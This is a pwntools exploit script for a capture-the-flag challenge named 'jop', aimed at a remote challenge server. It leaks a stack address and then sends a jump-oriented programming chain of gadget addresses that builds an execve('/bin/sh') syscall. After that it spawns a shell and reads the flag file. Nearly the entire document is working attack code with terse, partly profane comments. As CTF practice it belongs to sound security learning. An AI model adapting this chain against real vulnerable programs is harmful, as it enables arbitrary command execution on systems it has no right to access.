# i have no idea what i did, but it works

from pwn import *
context.binary = 'jop'
pad = b'A'*0xf8
#r = context.binary.process()
r = remote('chals.ctf.sg', 20101)
def select(i: int): r.sendafter('> ', str(i))
def feedback(b:bytes):
    select(2)
    r.sendafter('feedback: ', b)
select(4)
stack_leak = unpack(r.recv(8))
buf = stack_leak-0x100
#gdb.attach(r, gdbscript='b *0x40100f\nc')
#gdb.attach(r, gdbscript='b *0x401013\nc')
#gdb.attach(r, gdbscript='b *0x40101f\nc')
#gdb.attach(r, gdbscript='b *0x401159\nc\nc\nc')
#gdb.attach(r, gdbscript='b *0x40100f\nc\nc')
#gdb.attach(r, gdbscript='b *0x4010e0\nc\nc')
feedback(fit({
    0x000: 0x40101b, # change rsi
    0x008: 0x401010, # reset rdi and rdx
    0x010: 0x401024, # add rax, rdx
    0x018: 0x401155, # a motherfucking ret
    0x020: b'/bin/sh\0',
    0x028: 0x401021, # pop rdx, jmp [rcx]
    0x030: 0x401029, # pop rcx, jmp [rdx]
    0x038: 0x401000, # xchg...
    0x040: 0x40100A, # xor rax, jmp [rdx]
    0x100: 0x40100f,
    # jump to 0x40100f
    0x108: buf+0x110, # new rsp
    0x110: buf-1,# rdi
    0x118: 0x4000E0, # rcx: [rcx+0x10] == 0
    0x120: buf+0x8, # rdx
    # jump to [rdi+1] == 0x4010b
    # jump to [rdx] == 0x401010
    0x128: buf+0x10-1, #[rdi+1] == add rax
    0x130: buf+0x18, #[rcx] == pseudo-ret
    #0x138: 59-0x1d,  #rdx == sys_execve-0x1d
    0x138: buf+0x20-0x1d,  #rdx == "/bin/sh"-0x1d
    # jump to [rdi+1] == 0x401024
    # jump to [rcx] == 0x401155
    0x140: 0x40100f,
    # returning to 0x40100f. at this point, rsi is correct, rax == "/bin/sh"
    0x148: buf+0x50, # stack reset
    0x50: buf+0x28-1,# [rdi+1] == pop rdx, jump [rcx]
    0x58: buf+0x30,  # [rcx] == pop rcx, jmp [rdx]
    0x60: pack(0),   # garbage
    0x68: buf+0x38,  # [rdx] == xchg...
    0x70: buf+0x40,  # [rcx] == xor rax, jmp [rdx]
    # after here, RDI is correct, and we're back at pop rdx, jmp[rcx]
    0x78: buf+0x18,  # [rdx] == a ret!!
    0x80: 0x401016,  # goto pop rcx, jmp [rdx]
    0x88: buf+0x18,  # [rcx] == ret
    0x90: 0x401021,  # goto pop rdx, jmp [rcx]
    0x98: 59,        # rdx = sys_execve
    0xa0: 0x401024,  # goto add rax,rdx jmp[rcx]
    # here, rax, rdi, rsi are correct. Let's finish rdx.
    0xa8: 0x401021,  # goto pop rdx, jmp[rcx]
    0xb0: 0,
    0xb8: 0x4010E0,  # syscall
}))
r.sendline(b'cat /home/jop/flag.txt')
print(r.recvrepeat(timeout=1))

